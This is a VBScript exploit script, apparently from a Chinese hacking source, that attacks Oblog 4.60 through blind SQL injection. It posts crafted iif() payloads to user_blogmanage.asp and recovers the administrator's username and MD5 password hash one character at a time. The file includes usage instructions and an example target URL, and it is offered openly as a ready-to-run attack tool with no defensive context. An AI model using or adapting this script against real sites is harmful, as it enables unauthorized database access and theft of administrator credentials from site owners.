'============================================================================
'使用说明：
' 在命令提示符下：
' cscript.exe exp.vbs 要攻击的网站的博客路径 id subjectid 要破解的管理员id
'如：
' cscript.exe exp.vbs http://www.xxxx.com/blog/ 840 39 1
' by Mystery
'注：exp以剑心写的LBS Blog All version Exploit为模版修改而来
'============================================================================
On Error Resume Next
Dim oArgs
Dim olbsXML 'XMLHTTP对象用来打开目标网址
Dim TargetURL '目标网址
Dim userid '博客用户名
Dim TempStr '存放已获取的部分 帐号
Dim PwdTempStr '存放已获取的部分 MD5密码
Dim CharHex '定义16进制字符
Dim xCharHex '定义16进制字符
Dim charset

Set oArgs = WScript.arguments
If oArgs.count <> 4 Then Call ShowUsage()


Set olbsXML = createObject("Microsoft.XMLHTTP")

'补充完整目标网址
TargetURL = oArgs(0)
If LCase(Left(TargetURL,7)) <> "http://" Then TargetURL = "http://" & TargetURL
If right(TargetURL,1) <> "/" Then TargetURL = TargetURL & "/"
TargetURL=TargetURL & "user_blogmanage.asp?t=0&usersearch=0"

articleid = oArgs(1)
subjectid = oArgs(2)
userid = oArgs(3)
TempStr=""
Userlen=""
CharHex=Split("0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f",",")
xCharHex=Split("0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z",",")

WScript.echo "==============================================================="
WScript.echo "Oblog 4.60 Final Access SQL Injection Exploit"
WScript.echo "By Mystery"
WScript.echo "http://hi.baidu.com/netstart   "
WScript.echo "==============================================================="
WScript.echo "[+] Fuck the site now"

Call GetLength(TargetURL,BlogName)

Call GetUser(TargetURL,BlogName)

Call GetPwd(TargetURL,BlogName)

Set oBokeXML = Nothing

'----------------------------------------------sub-------------------------------------------------------

'============================================
'函数名称：GetLength
'函数功能：注入获得blog 用户长度
'============================================
Sub GetLength(TargetURL,BlogName)
Dim LenOffset,OpenURL,xGetPage
WScript.Echo "[~] Trying to get user name length..."
For LenOffset = 1 To 20

     postdata = ""
	 postdata = " and 2=(iif((select len(username) from oblog_admin where id=" & userid & ")=" & LenOffset & ",2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
xGetPage = BytesToBstr(olbsXML.ResponseBody)
'判断访问的页面是否存在
     'WScript.echo xGetPage
If InStr(xGetPage,"更新系统分类成功")<>0 Then 
Userlen=LenOffset
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript 运行时错误")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
Next
WScript.Echo "[+] length：" & Userlen 
WScript.Echo "[~] Trying to Crack..."
End sub



'============================================
'函数名称：GetUser
'函数功能：注入获得blog 用户帐号
'============================================
Sub GetUser(TargetURL,BlogName)
Dim yMainOffset,ySubOffset,TempLen,OpenURL,yGetPage,xLen
xLen = UserLen
For yMainOffset = 1 To Userlen
For ySubOffset = 0 To ubound(xCharHex)
TempLen = 0
     postdata = ""
	 postdata = " and 2=(iif((select left(username,"&yMainOffset&") from oblog_admin where id=" & userid & ")='" & TempStr&xCharHex(ySubOffset) & "',2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
GetPage = BytesToBstr(olbsXML.ResponseBody)
If InStr(GetPage,"更新系统分类成功")<>0 Then 
TempStr=TempStr & xCharHex(ySubOffset)
WScript.Echo "[+] Crack now："&TempStr &String(xLen-yMainOffset, "?")
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript 运行时错误")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
next
Next
End sub

'============================================
'函数名称：GetPwd
'函数功能：注入获得blog 用户密码
'============================================
Sub GetPwd(TargetURL,BlogName)
Dim MainOffset,SubOffset,TempLen,OpenURL,GetPage
For MainOffset = 1 To 16
For SubOffset = 0 To 15
TempLen = 0
     postdata = ""
	 postdata = " and 2=(iif((select left(password,"&MainOffset&") from oblog_admin where id=" & userid & ")='" & PwdTempStr&CharHex(SubOffset) & "',2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
GetPage = BytesToBstr(olbsXML.ResponseBody)
If InStr(GetPage,"更新系统分类成功")<>0 Then 
PwdTempStr=PwdTempStr & CharHex(SubOffset)
WScript.Echo "[+] Crack now："&PwdTempStr &String(16-MainOffset, "?")
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript 运行时错误")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
next
Next
WScript.Echo vbcrlf& "[+] We Got It：" & vbcrlf & "[username]: " & TempStr & vbcrlf & "[password]: " & PwdTempStr & vbcrlf &vbcrlf&":P Don't Be evil"
End sub


'============================================
'函数名称：BytesToBstr
'函数功能：将XMLHTTP对象中的内容转化为GB2312编码
'============================================
Function BytesToBstr(body)
dim objstream
set objstream = createObject("ADODB.Stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = "GB2312"
BytesToBstr = objstream.ReadText
objstream.Close
set objstream = nothing
End Function

'============================
'函数名称：ShowUsage
'函数功能：使用方法提示
'============================
Sub ShowUsage()
WScript.echo "Oblog 4.60 Final Access SQL Injection Exploit" & vbcrlf & "By Mystery"
WScript.echo "Usage:"& vbcrlf & " CScript " & WScript.ScriptFullName &" TargetURL id subjectid userid"
WScript.echo "Example:"& vbcrlf & " CScript " & WScript.ScriptFullName &" http://www.xxxx.com/blog/ 840 39 1"
WScript.echo ""
WScript.Quit
End Sub
